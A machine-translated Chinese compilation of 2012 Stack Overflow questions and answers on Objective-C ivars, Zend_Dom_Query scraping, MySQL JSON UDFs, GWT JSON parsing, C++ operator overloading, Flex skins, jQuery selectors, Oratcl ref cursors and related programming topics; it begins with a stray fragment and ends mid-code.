我想建议使用`javax.persistence_2.0.4.v201112161009`和`eclipselink.jar`版本`EclipseLink 2.4.1`。[下载 EclipseLink 2.4.1](http://www.eclipse.org/downloads/download.php?file=/rt/eclipselink/releases/2.4.1/eclipselink-2.4.1.v20121003-ad44345.zip)

# objective-c - 如何在目标 c 中创建 BOOL 实例变量？

> ID：10685024
> 
> 赞同：21
> 
> 时间：2012-05-21T12:11:14.880
> 
> 标签：objective-c, ios, xcode, boolean

我需要在我的一个 Objective-C 类中创建一个类型`BOOL`为默认值的实例变量。`False`我该怎么做呢？我见过人们在他们的 .h 文件中定义它，但我并不真的需要公开这个变量。因此我不应该把它放在我的 .m 文件中吗？此外，我应该将其设为财产吗？或者我不应该让某物成为财产？谢谢。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-05-21T12:46:08.637

> 我需要在我的一个目标 c 类中创建一个默认值为 FALSE 的 BOOL 类型的实例变量。我该怎么做呢？

假设您使用的是当前 Xcode，您可以在实现中声明 ivar，如下所示：

```
@implementation MyClass
{
@private
    BOOL myBool;
} 
```

> 我见过人们在他们的 .h 文件中定义它，但我并不真的需要公开这个变量。

`@interface`从历史上看，由于类的实现方式，您必须在 中声明实例变量。现在仅当您针对 32 位 OS X 时才需要这样做。

> 此外，我应该将其设为财产吗？

那要看。如果它是类的外部 API 的一部分（供不相关的类或子类使用。如果它只是对象内部状态的一部分，则不需要将其设为属性（我不需要） t)。

> 或者我不应该让某物成为财产？谢谢。

如果您不使用 ARC 并且类型是对象类型（BOOL 不是），则应始终将其设为属性以利用合成访问器的内存管理。如果您使用的*是*ARC，Apple 开发人员列表上的建议是将属于 API 属性的内容和内部状态的内容制作为 ivars。

请注意，即使对于内部状态，您也可能希望使用 KVO，在这种情况下，请使用属性。

如果将此 BOOL 声明为属性并对其进行综合，则无需显式声明 ivar。如果您想让属性仅对类本身“可见”，请使用类扩展

```
@interface MyClass()

@property (assign) BOOL myBool;

@end

@implementation MyClass

@synthesize myBool = myBool_;  // creates an ivar myBool_ to back the property myBool.

@end 
```

请注意，尽管编译器会针对上述情况产生警告，但在运行时，任何类都`setMyBool:`可以`myBool`向`MyClass`.

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-05-21T12:20:38.323

如果你想创建一个私有变量，你可以使用类别的力量。例如，创建一个 MyClass 类，并在 .m 文件中执行以下操作：

```
#import "MyClass.h"

@interface MyClass() //This is an empty category on MyClass class

@property (nonatomic, assign) BOOL myBool;

@end

@implementation MyClass

@synthesize myBool = _myBool;

-(void)myMethod {
   self.myBool = YES; //this is using the property
   _myBool = NO; //this is the instance variable, as @synthesize creates an instance variable for you
   // both are private
}

@end 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-21T12:19:51.950

BOOL 被声明为带有简单 的 iVar `BOOL myBool`，并被声明为带有`@property (nonatomic, assign) BOOL myBool`. 但请注意，布尔值初始化为 NO (nil)。如果您需要从其他类访问 BOOL 或 m 文件中的“全局”，请使用 iVar 或属性，否则只需在单个方法中将它们声明为作用域变量。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-21T12:22:16.940

您可以将声明放入`.m`文件中。

您是否从中获得财产，取决于您想要什么。作为属性，您可以稍后应用包括检查/守卫/任何内容的 setter/getter。此外，您可以应用键值访问。

如果您不需要其中之一，那么就没有真正需要属性（但一个好的传统：您永远不知道您的代码将如何发展）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-21T12:16:38.463

如果您将其设为财产，则它是公开的。如果您不希望变量公开，则不要使用属性。为什么不想公开？您可以拥有 readonly 属性并通过私有类别在您的 .m 中写入。

如果你使用 iOS 5，你可以把它放在你的 .m 文件中

```
@implementation MyClass {
     BOOL _myBool;
} 
```

我认为这对 iOS5 来说是新的。但我也见过这样的代码：

```
@implementation MyClass {
@private
     BOOL _myBool;
} 
```

希望这可以帮助。

# php - Zend_Dom_Query 获取数组

> ID：10685025
> 
> 赞同：0
> 
> 时间：2012-05-21T12:11:17.843
> 
> 标签：php, zend-framework, dom, screen-scraping, zend-dom-query

我正在尝试从关联数组中的网站抓取 html 代码。我用 Zend_Dom_Query 试过了。

**例子：**

```
<div class="job">
   <div class="jobTitle">
    <a href="http://website.com/Job-Title-1">Job-Title-1</a>
   </div>
   <div class="company">
   <a href="http://website.com/Company-1">Company-1</a>
   </div>
   <div class="city">
   <a href="http://website.com/City-1">City-1</a>
   </div>
</div>
<div class="job">
    <div class="jobTitle">
    <a href="http://website.com/Job-Title-2">Job-Title-2</a>
    </div>
    <div class="company">
       <a href="http://website.com/Company-2">Company-2</a>
   </div>
   <div class="city">
      <a href="http://website.com/City-2">City-2</a>
   </div>
</div> 
```

我如何从上面的 html 中获取关联数组？

```
 $dom = new Zend_Dom_Query($html);
 $links = $dom->query('div.jobTitle a');
 $companies = $dom->query('div.company');
 $cities = $dom->query('div.city');

 //result needed
 $result_array = array( array( link => 'http://website.com/Job-Title-1', 
         Company => 'Company-1', 
         City => 'City-1'
        ),
      array( link => 'http://website.com/Job-Title-2', 
         Company => 'Company-2', 
         City => 'City-2'
        )
     ); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-15T13:49:00.317

```
 $dom=new Zend_Dom_Query($html);
    $links=$dom->query('div.jobTitle a');
    $companies=$dom->query('div.company');
    $cities=$dom->query('div.city');

        $data=[];
    foreach ($links as $link){
        $data[]=[
           'link'=> $link->getAttribute('href'),
           'Company'=>trim($companies->current()->textContent),
           'City'=>trim($cities->current()->textContent)
           ];
        $companies->next();
        $cities->next();
    }
    var_dump($data); 
```

# mysql - mysql lib_msqludf_json 错误：无法初始化函数'json_object'；无效的 json 成员名称 - 名称不能为空

> ID：10685028
> 
> 赞同：1
> 
> 时间：2012-05-21T12:11:26.987
> 
> 标签：mysql

我正确安装了 lib_mysqludf_json。json_array、json_members 等函数工作正常。json_object 函数有一个东西。

我有一个包含两列键和值的表。我运行这个查询

`select json_object(key, value) as settings from ph_settings where key = 1`

我收到这个错误

`ERROR 1123 (HY000): Can't initialize function 'json_object'; Invalid json member name - name cannot be empty`

这是关于什么的？现在从错误消息中可以看出 json_member 应该包含在 json-object 函数中。但是在文档中有这个例子，据他们说它是有效的。

```
select json_object(
    customer_id
   ,first_name
   ,last_name
   ,last_update
) as customer
from   customer 
where  customer_id =1; 
```

请帮忙...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T10:51:09.720

我发现它只有在您按如下方式命名每一列时才有效：

```
select 
    json_object(id as 'id', name as 'name',  address as 'address') AS 'blobby' 
from 
    tempo_1; 
```

在上面的示例中，列别名不需要 '' 分隔符，并且最后的行别名似乎是可选的，因此以下内容似乎也是有效的

```
select 
    json_object(id as id, name as name,  address as address) 
from 
    tempo_1; 
```

# yahoo-api - 使用 yahoo ID 或 yahoo guid 获取 Yahoo 电子邮件地址？

> ID：10685029
> 
> 赞同：0
> 
> 时间：2012-05-21T12:11:27.870
> 
> 标签：yahoo-api

如何使用 yahoo ID 或 yahoo guid 获取 Yahoo 电子邮件地址？

我完成了 yahoo API Outh 来获取 Yahoo! 用户的数据 Messenger，但不能直接向他们发送电子邮件，因为数据中没有电子邮件地址，但有 yahoooid ...

```
e.g. yahooid => john123 
```

如果附加`@yahoo.com`到它的*yahoooid*字段。如我所见，这是完全错误的。因为对于一个 yahoooid，比如说`john123`，相关的电子邮件可能有一个国际域名，比如`john123@yahoo.co.uk, john123@yahoo.com.vn`etc。

我可以使用 yahoooid 来获取他的 guid，使用 YQL：

```
select guid from yahoo.identity where yid='john123' 
```

如何使用 yahoo ID 或 yahoo guid 获取 Yahoo 电子邮件地址？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-20T00:56:39.770

按照设计，您无法从 Yahoo ID 或 GUID 获取 Yahoo 电子邮件地址。在早期，您通常可以推断出对于给定的 id “yournamehere”，电子邮件地址将是“yournamehere@yahoo.com”。这不再是一个安全的假设，部分原因是您提到的国际域名，并有助于防止垃圾邮件发送者。

通常，应用程序或网站开发人员会通过在 OAuth 或 OpenID 身份验证流程中询问用户他们的电子邮件地址来解决此问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-26T04:16:55.123

使用 YQL XML 或 JSON 获取用户的电子邮件（用户登录后）[http://developer.yahoo.com/yql/console/?q=select%20%2a%20from%20social.profile%20where%20guid%20=% 20米](http://developer.yahoo.com/yql/console/?q=select%20%2a%20from%20social.profile%20where%20guid%20=%20me)

# json - GWT 中的 JSON 解析

> ID：10685031
> 
> 赞同：1
> 
> 时间：2012-05-21T12:11:29.980
> 
> 标签：json, gwt, smartgwt

我们已经将 GWT 平台与 GWTP 客户端和 GUICE 容器中的其他 Web 服务一起使用。来自 GWT 客户端的 Rest 服务调用是使用 JSONPRequestbuilder 完成的。

我想知道 GWT 的最佳 JSON 响应字符串解析技术是什么？- JSON 到 Java 序列化/反序列化

在谷歌上大量搜索后，我发现我们有很多选择。

1.  GWT 内置 JSONParser parseStrict 方法，称为安全且最佳的方法。但这可能不适合复杂的 JSON 响应字符串。因为您需要编写大量代码来解析 JSON 响应中的每个项目并转换为 Java 对象。
2.  GWT AutobeanFactory 方法 - 我不知道如何最好地使用它？我们使用的是 GWT 2.4，您根本没有使用这种方法的完整示例。在任何地方，人们都说它是一种方法，但我们没有对此进行详细描述。google 上的一些示例来自 gwt 旧版本，这些版本在 GWT 2.4 中发生了很大变化。请有人用 GWT 2.4 和 JSON ser/deser 的 Autobean 工厂方法分享一个很好的例子......
3.  JavaScript 覆盖类型：人们说这不是安全的方式。所以我有点犹豫我们是否应该使用它。

此外，我们很快就会从 GWT 迁移到 SmartGWT。我希望，即使在 SmartGWT 中，其余的调用服务也应该继续工作而无需任何更改。（因为 SmartGWT 还附带了预定义格式的 JSON 休息支持，我们可能不会使用它，因为我们通常已经构建了这些服务）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T12:43:09.863

如果您需要自省（您的 JSNO 对象没有严格的架构），请使用`JSONParser`.
您还可以使用稍微容易使用但根本没有记录的 API `com.google.web.bindery.autobean.shared.Splittable`（更具体地说是`JsonSplittable`在 DevMode 和`JsoSplittable`in prod 模式下）。

如果您有严格的模式，则使用 JSO 覆盖类型或 AutoBean。与 JSO 相比，AutoBean 的开销较小，但允许使用自定义 JSO `List`，`Set`而`Map`不是`JsArray`自定义 JSO。AutoBean 也可以*通过*. `AutoBeanFactorySource`这对于不需要`GWTTestCase`sluggish 的单元测试也很有用，这与 JSO 不同。

您可以在其官方文档中找到 AutoBean 的示例：[http ://code.google.com/p/google-web-toolkit/wiki/AutoBean](http://code.google.com/p/google-web-toolkit/wiki/AutoBean)

至于*安全性*，只要您使用`parseStrict`（AutoBean 在后台使用，所以不用担心），那么您就是安全的。JSO 的安全性不会低于 AutoBean 或`JSONParser`（或`Splittable`）。

# visual-c++ - c++ 二叉树重载

> ID：10685035
> 
> 赞同：0
> 
> 时间：2012-05-21T12:11:38.833
> 
> 标签：visual-c++

我创建了一个包含一个字符和一个字符串的结构

```
 struct M2E
 { char english;
 string morse;} 
```

通过使用由给出的代码，我创建了一个 M2E 的二叉树，它是 bintree，但我想以字符串莫尔斯顺序对这些 M2E 进行排序（“*”小于“-”）所以我在 struct M2E 中做了一个运算符重载

```
 bool operator == (M2E& other) const
{
    return morse.compare(other.morse);
} 
```

但是我在编译时不断给出以下错误消息

```
no match for "operator ==" in ((binNode<M2E>*)this)->binNode<M2E>::nodeData == dataItem
note:candidates are :bool M2E::operator==(M2E&) const 
```

我用于二叉树的代码 bintree.h 是：

```
 template <typename dataType> class bintree
{  
  private:
  binNode<dataType> *root;
  int numItems;

  void insert(const dataType& newData) 
  {
     // insert the newData into the tree

     if (root == NULL) 
     {
        root = new binNode<dataType>(newData);
     } 
     else 
     {
        root->insert(root, newData);
     }
     numItems++;
  } 
```

我用于二进制节点的代码 binnode.h 是：

```
 template <typename dataType> class binNode 
 {
 private:
  // private data ====================================
  dataType nodeData;
  binNode<dataType> *left, *right;

        void insert(binNode<dataType>* &root, const dataType& dataItem) 
  {
     if (nodeData == dataItem) 
     {
        throw std::invalid_argument("dataItem already in tree");
     }

     if (dataItem < nodeData) 
     {
        if (left == NULL) 
        {
           left = new binNode(dataItem);
        } 
        else 
        {
           left->insert(left, dataItem);
        }
     } 
     else 
     {
        if (right == NULL) 
        {
           right = new binNode(dataItem);
        } 
        else 
        {
           right->insert(right, dataItem);
        }
     }
     rebalance(root);
  } 
```

谢谢帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:21:21.653

问题是你正在接受一个`const datatype dataItem`in `insert()`，但`operator==`接受一个非常量`M2E`参数。

您需要将`operator==`参数类型指定为`const`：

```
bool operator == (const M2E& other) const {
  //...
} 
```

请记住，这`const`是一个契约：函数承诺不会改变其参数的值。所以`insert()`做出这个承诺，但`operator==`没有，所以`insert()`不能让那个运营商按原样称呼它。通过添加`const`to`operator==`的参数类型，你做出`operator==`了同样的承诺，所以`insert()`可以调用它

# actionscript-3 - Flex AS3 - 自定义按钮

> ID：10685036
> 
> 赞同：1
> 
> 时间：2012-05-21T12:12:02.720
> 
> 标签：actionscript-3, apache-flex, button

我需要一些输入。在 Flash Builder 中实现自定义按钮的最佳（推荐）方法是什么？

我所说的自定义按钮的意思是，我需要展示例如一栋有 5 层楼的建筑物（在 3d 视图中）。然后用户可以单击每个楼层，以更新主视图以显示当前选择的楼层。

在前面的示例中，我只是在图像下方添加了一个不可见层，其中每个按钮（每个楼层）都包含一种纯色。单击图像会触发一个检查选择什么颜色的功能，然后触发我想要的操作。

有没有更好的方法来做到这一点？

也许导入与主应用程序通信的外部 SWF 以发送楼层切换命令？（并不是说我知道如何从导入的外部 SWF 与主应用程序进行通信，只是反过来）。

任何输入都会很棒=）

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T12:43:38.310

**编辑**

*在您提出问题后，我迅速整理了一些东西来表明按钮可以是任何形状。如果您希望楼层是可选的，那么您可能想要 a `ToggleButton`，而不是 a`Button`所以我重新设计了我的示例，结果就是您所描述的*

![在此处输入图像描述](../Images/56bf78255b6bbaffb3d9d349a0f0fd43.png)

为什么不使用 Flex 4.0 蒙皮功能？您可以使用自己的外观/感觉获得按钮组件的行为（和状态）：

```
<s:ToggleButton skinClass="FloorButton" y="0"  />
<s:ToggleButton skinClass="FloorButton" y="25" />
<s:ToggleButton skinClass="FloorButton" y="50" /> 
```

您`FloorButton`使用一些图像定义按钮皮肤 ( )：

```
<?xml version="1.0" encoding="utf-8"?>
<s:SparkButtonSkin xmlns:fx="http://ns.adobe.com/mxml/2009" 
                   xmlns:s="library://ns.adobe.com/flex/spark" 
                   xmlns:fb="http://ns.adobe.com/flashbuilder/2009"
                   alpha.disabledStates="0.5">

    <fx:Metadata>
    <![CDATA[ 
        [HostComponent("spark.components.ToggleButton")]
    ]]>
    </fx:Metadata>

    <s:states>
        <s:State name="up" />
        <s:State name="over" stateGroups="overStates" />
        <s:State name="down" stateGroups="downStates" />
        <s:State name="disabled" stateGroups="disabledStates" />
        <s:State name="upAndSelected" stateGroups="selectedStates, selectedUpStates" />
        <s:State name="overAndSelected" stateGroups="overStates, selectedStates" />
        <s:State name="downAndSelected" stateGroups="downStates, selectedStates" />
        <s:State name="disabledAndSelected" stateGroups="selectedUpStates, disabledStates, selectedStates" />
    </s:states>

    <s:Path data="M 0 0 L 20 20 L 40 0 L 40 20 L 20 40 L 0 20">
        <s:fill>
            <s:SolidColor color="#AAAAAA" color.selectedStates="#000000" color.over="#777777" />
        </s:fill>
    </s:Path>

</s:SparkButtonSkin> 
```

当然，可以将路径替换为具有透明度的PNG，以达到类似的效果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:40:03.347

当您使用 flex 时，为什么不使用 flex 组件并为它们蒙皮？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:22:57.683

[本](http://rabidgadfly.com/2010/09/easily-create-image-buttons-flex-4/)教程介绍如何在 Flex 4 中进行按钮蒙皮，逐步完成该过程。

Flex 4 还支持易于实现的[3d 效果](http://help.adobe.com/en_US/flex/using/WSF0D55C84-17E0-456a-A977-04BFE1E23BA8.html)（您在问题中提到过）。

# android - Mediaplayer 中的原生库

> ID：10685037
> 
> 赞同：0
> 
> 时间：2012-05-21T12:12:03.240
> 
> 标签：android, media-player, native

在哪里可以找到 Android 中 MediaPlayer 类中使用的本机库？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:37:12.870

这是Github 的 Android 存储库上的[代码。](https://github.com/android/platform_frameworks_base/tree/master/media)例如，[JNI 层](https://github.com/android/platform_frameworks_base/blob/master/media/jni/android_media_MediaPlayer.cpp)和[MediaPlayer](https://github.com/android/platform_frameworks_base/blob/master/media/libmedia/IMediaPlayer.cpp)原生类。

# android - 从另一个 Activity 调用按钮

> ID：10685039
> 
> 赞同：0
> 
> 时间：2012-05-21T12:12:22.737
> 
> 标签：android, button, android-activity

如何从另一个 Activity 编辑按钮？

它返回给我一个

```
java.lang.IllegalStateException: Could not execute method of the activity
Caused by: java.lang.NullPointerException 
```

当我想

```
getButton.setEnabled(false); 
```

在哪里

```
Button getButton = (Button)findViewById(R.id.buttonGet); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T12:18:26.817

我不认为你可以，或者至少它不是“Android 方式（tm）”。
相反，要么设置一个首选项标志并在目标活动的 OnResume 上读取它，或者如果目标（带有按钮的那个）调用另一个，你可以使用 setResult(...) 返回一些东西并在 onActivityResult(.. .)。

编辑：看起来我回答了他所说的“从另一个调用一个按钮（即与当前不同）”活动，但他的真正**意思**是他在当前一个中找不到他的按钮:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-21T12:17:06.170

确保在获得对按钮的引用之前调用了 setContentView，即执行以下操作：

```
setContentView(R.layout.my_activity_layout); 
```

在这之前：

```
Button getButton = (Button)findViewById(R.id.buttonGet); 
```

# overlay - Xwindow 父级中的透明窗口

> ID：10685042
> 
> 赞同：5
> 
> 时间：2012-05-21T12:12:48.553
> 
> 标签：overlay, x11, transparent, xlib

我正在尝试在另一个正在运行的应用程序上方创建一个覆盖窗口。比方说火狐。我通过使用 Xcreatewindow 实现

```
win = XCreateWindow( display, *firefoxwindow,
                   50, 300, 400, 400,
                   0,
                   visualinfo.depth,
                   InputOutput,
                   visualinfo.visual,
                   CWColormap|CWEventMask|CWBackPixmap|CWBorderPixel,
                   &attr
                   ) ; 
```

我使用 XQueryTree() 搜索了 *firefoxwindow

然后按照此代码 [https://gist.github.com/903479](https://gist.github.com/903479)

当我使用 XRoot 作为父级时，结果是透明窗口。但是，当我尝试使用 firefoxwindow 或其他应用程序窗口作为父窗口时，它变得很漂亮。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-22T04:30:15.680

在您的情况下，您需要手动将窗口像素图与背景窗口合成。当您创建以根为父级的窗口时，透明度由合成窗口管理器处理

# javascript - 如何使html复选框变灰？

> ID：10685048
> 
> 赞同：16
> 
> 时间：2012-05-21T12:13:10.670
> 
> 标签：javascript, jquery, css

我想制作只读复选框。像这样：

```
<input type="checkbox" onclick="return false;"> 
```

我希望复选框看起来像被禁用或变灰。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-05-21T12:14:55.603

您还需要禁用该复选框：

```
<input type="checkbox" onclick="return false;" disabled="disabled"> 
```

**要发布该值，只需将其设为只读即可：**

```
<input type="checkbox" onclick="return false;" readonly="readonly"> 
```

您可以使用 CSS 设置复选框标签和只读输入的样式，例如：input [readonly="readonly"] {} 但浏览器应使复选框在设置为只读时显示为灰色。

**更新：**

在设置复选框样式并在所有浏览器中一致地设置它们的样式时，您会受到浏览器的支配，您必须求助于图像，例如：[https ://archive.is/TNUH1](https://archive.is/TNUH1)

如果您不想这样做（这似乎是一个冗长的解决方案），最简单的解决方案是禁用复选框以使其正确显示，并将值作为隐藏输入发布，例如：

```
<input type="checkbox" onclick="return false;" disabled="disabled">
<input type="hidden" name="checkboxval" value="111" /> 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-21T12:14:58.380

只需像这样在复选框上添加“禁用”属性

```
<input type="checkbox" disabled="disabled" /> 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2017-03-30T18:52:43.243

简单的，仅 css 的方法来灰显禁用的复选框。

```
input[type=checkbox][disabled] {
    filter: invert(25%);
} 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-05-21T12:15:43.473

```
$('input.readonly').on('click', function(evt) {
   evt.preventDefault();
});
```

```
input.readonly {
   opacity: .5;
   filter: alpha(opacity=50); /* IE<9 */
   cursor: default;
}
```

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<input type="checkbox" class="readonly">
```

`readonly`向要变灰的元素添加一个类：通过 css 设置`opacity`并更改`cursor`. 然后删除内联 javascript 并阻止`input.readonly`click 事件上元素的默认操作

# asp.net-mvc - 使用 Razor 保持切片干燥

> ID：10685049
> 
> 赞同：0
> 
> 时间：2012-05-21T12:13:11.447
> 
> 标签：asp.net-mvc, razor

Razor 有没有办法让切片保持​​干燥？

在父视图中：

```
@RenderSection("Foo")

More content..

@RenderSection("Foo") 
```

在子视图中：

```
@section {
   <text>bar</text>
} 
```

当我尝试使用相同名称的 2 个部分时出现错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:22:54.650

[RenderSection](http://msdn.microsoft.com/en-us/library/gg547830%28v=vs.99%29)是一个有返回值的方法（所以它不会直接写入`Response`）。将值存储在变量中并在您想要的任何地方使用它：

就像是：

```
@{ var fooSection = RenderSection("Foo").ToHtmlString(); }

@Html.Raw(fooSection)

More content..

@Html.Raw(fooSection) 
```

# oracle - oratcl ORA-24338: 语句句柄未执行

> ID：10685051
> 
> 赞同：1
> 
> 时间：2012-05-21T12:13:19.543
> 
> 标签：oracle, tcl

使用 oratcl 的简单示例：

# 创建表和简单包

```
CREATE TABLE test (id INTEGER,val INTEGER);
INSERT INTO test (id,val) values (1,10);
INSERT INTO test (id,val) values (2,20);
INSERT INTO test (id,val) values (3,30);
INSERT INTO test (id,val) values (4,40);

CREATE OR REPLACE PACKAGE  tst is
  FUNCTION get_test RETURN sys_refcursor;
END; 
/

CREATE OR REPLACE  PACKAGE BODY tst is
  FUNCTION get_test  RETURN sys_refcursor
IS
   retval sys_refcursor;
BEGIN
    OPEN retval FOR SELECT * FROM test ORDER BY id;
 RETURN retval;
END;
END;
/ 
```

# Tcl函数如下：

```
package require Oratcl

proc getLoginStr {} {
   set userName  "xxx"
   set password  "xxxx"
   set db        "xxx"
   append retval  $userName "/" $password "@" $db
}

set _lda ""
set _sqlH ""

proc init {} {
  global _lda
  global _sqlH
 set _lda [oralogon [getLoginStr]]
 set _sqlH [oraopen $_lda]
}

proc prepare {} {
  global _sqlH
  set Sql {
         begin
             :retval := tst.get_test();
         end;                   
 }

 ::db_ora::parseSql $_sqlH $Sql 
}

proc go {} {
  global _lda
  global _sqlH

  set curH [oraopen $_lda]
  set pv_lst [list :retval $curH] 

  orabind $_sqlH  :retval $curH
  oraexec $_sqlH

  set retval ""

  while {[orafetch $curH -datavariable row] == 0} {
    puts "row : $row" 
    lappend retval  $row
  }
return $retval
} 
```

# 运行以下脚本一次：

```
source test.tcl
init
prepare
go 
```

## 输出：

```
row : 1 10
row : 2 20
row : 3 30
row : 4 40
{1 10} {2 20} {3 30} {4 40} 
```

# 重新运行 go 程序

```
go 
```

## 输出：

```
row : 
row : 
row : 
row : 
row : 
row : 
row : 
row : 
row : 
row : 
ORA-24338: statement handle not executed 
```

有任何想法吗？为什么脚本在重新运行时不起作用？如果我没记错的话，它应该重用打开的句柄_SqlH。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:27:52.827

我认为您不需要 tcl 来查看此行为。您可以使用纯 SQL 重现此内容。一旦您对`sys_refcursor`已返回的 进行了迭代`tst.get_test()`，您就不能“倒回”它并再次迭代。

请参阅有关如何使用 ref_cursors (10.2) [http://docs.oracle.com/cd/B19306_01/appdev.102/b14261/sqloperations.htm#i7106的文档](http://docs.oracle.com/cd/B19306_01/appdev.102/b14261/sqloperations.htm#i7106)

所以在这个当前的形式下，你只能在`go`再次运行之后`prepare`再次运行 tcl。

# jquery - 带有上下文的 jQuery 选择器不起作用

> ID：10685054
> 
> 赞同：1
> 
> 时间：2012-05-21T12:13:28.600
> 
> 标签：jquery, selector

我希望这段代码只会更改最后一个 div (Div5) 上的文本，但它不会：

```
<script type="text/javascript" language="javascript">
    $(document).ready(function() {
        $(".blue", "#Div5").text("Hello");
    });
</script>

<form id="form1" runat="server">
<div>

    <div id="Div1" class="blue">AAAA</div>
    <div id="Div2" class="yellow">BBBB</div>
    <div id="Div3" class="blue">CCCC</div>
    <div id="Div4" class="yellow">DDDD</div>
    <div id="Div5" class="blue">EEEE</div>

</div>
</form> 
```

有人碰巧知道出了什么问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:16:00.220

那是在 div 中寻找 .blue ，并且在语义上等同于

```
$("#Div5").find(".blue").text("Hello"); 
```

你要：

```
$("#Div5.blue").text("Hello"); 
```

...相当于：

```
if ($("#Div5").hasClass("blue")) {
    $("#Div5").text("Hello");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:16:05.197

可能是这样？

```
$("#Div5").text("Hello"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T12:16:06.913

上下文用于指定容器元素。在您的示例中，您在上下文中引用与选择器相同的元素。

您可以简化为：

```
$("#Div5").text("Hello"); 
```

或者，如果您仍想显式指定类：

```
$("#Div5.blue").text("Hello"); 
```

两者都会有相同的结果。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T12:16:09.143

在这种情况下，您不能使用上下文（即*容器*）。你应该像这样定位你的元素：

```
$("#Div5.blue"); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-21T12:16:19.197

你只需要

```
$(document).ready(function() {
    $("#Div5").text("Hello");
}); 
```

您尝试做的是在ID 为“Div5”的标签中找到一个带有类的标签`blue` *。*由于没有嵌套的 div，因此它不起作用。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-21T12:16:41.467

这不是上下文选择器，因为它们都是 html 中的相同元素

```
 $(".blue", "#Div5") 
```

表示选择 #div5 的子项 .blue 项

所以那个html是

```
<div id="div5">
<div class="blue"></div>
</div> 
```

你只需要 $('#div5").text('text');

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-05-21T12:19:01.407

我认为 context 参数必须是一个 jQuery 对象，或者至少是一个 HTMLDOMElement （或者它们被称为的任何东西。：P）

```
jQuery(document).ready(function(){
    var $contextElement = jQuery("#Div5");
    jQuery(".blue", $contextElement).text("Hello");
}); 
```

不过，从您的标记来看，我想说您根本不想使用上下文，而只是选择器，如下所示：

```
jQuery("#Div5").text("woop woop!"); 
```

您甚至不需要定位`blue`类，因为 ID 是唯一的。事实上，即使你有两个 ID 为`Div5`jQuery 的元素，也只会返回一个，即第一个。

# java - 如何修改 GroupLayout 中的组件？

> ID：10685056
> 
> 赞同：1
> 
> 时间：2012-05-21T12:13:31.947
> 
> 标签：java, swing, layout-manager, grouplayout

好吧，我正在使用 GroupLayout 来放置组件。这是一个代码。

```
groupLayout.setHorizontalGroup(
            groupLayout.createParallelGroup(Alignment.LEADING)
                .addGroup(groupLayout.createSequentialGroup()
                    .addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
                        .addGroup(groupLayout.createSequentialGroup()
                            .addGap(10)
                            .addComponent(BrandName, GroupLayout.PREFERRED_SIZE, 134, GroupLayout.PREFERRED_SIZE))
                        .addGroup(groupLayout.createSequentialGroup()
                            .addContainerGap()
                            .addComponent(brand, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                            .addPreferredGap(ComponentPlacement.RELATED)
                            .addComponent(price, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                        .addGroup(groupLayout.createSequentialGroup()
                            .addContainerGap()
                            .addComponent(rugType, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                            .addPreferredGap(ComponentPlacement.RELATED)
                            .addComponent(materialType, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                            .addPreferredGap(ComponentPlacement.RELATED)
                            .addComponent(rugAmount, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                        .addGroup(groupLayout.createSequentialGroup()
                            .addContainerGap()
                            .addComponent(textField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                            .addPreferredGap(ComponentPlacement.RELATED)
                            .addComponent(textField_1, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                            .addPreferredGap(ComponentPlacement.RELATED)
                            .addComponent(okButton, GroupLayout.PREFERRED_SIZE, 55, GroupLayout.PREFERRED_SIZE)))
                    .addContainerGap(115, Short.MAX_VALUE))
        );
        groupLayout.setVerticalGroup(
            groupLayout.createParallelGroup(Alignment.LEADING)
                .addGroup(groupLayout.createSequentialGroup()
                    .addGap(11)
                    .addComponent(BrandName, GroupLayout.PREFERRED_SIZE, 24, GroupLayout.PREFERRED_SIZE)
